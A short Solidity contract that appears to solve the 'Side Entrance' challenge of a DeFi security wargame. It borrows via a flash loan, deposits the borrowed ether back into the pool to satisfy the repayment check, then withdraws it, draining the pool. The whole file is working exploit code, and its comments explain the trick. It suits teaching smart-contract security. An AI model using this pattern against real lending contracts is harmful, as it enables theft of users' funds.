// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceAttacker {
    SideEntranceLenderPool pool;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    fallback() external payable {}

    function execute() external payable {
        pool.deposit{value: msg.value}();
        // Because of this deposit, line 36 of the flash loan evaluates as True
    }

    function takeFlashLoan(uint256 _amount) external {
        pool.flashLoan(_amount);
        // after the flashLoan completes, we withraw all our funds again (needs fallback function)
        pool.withdraw();
    }
}
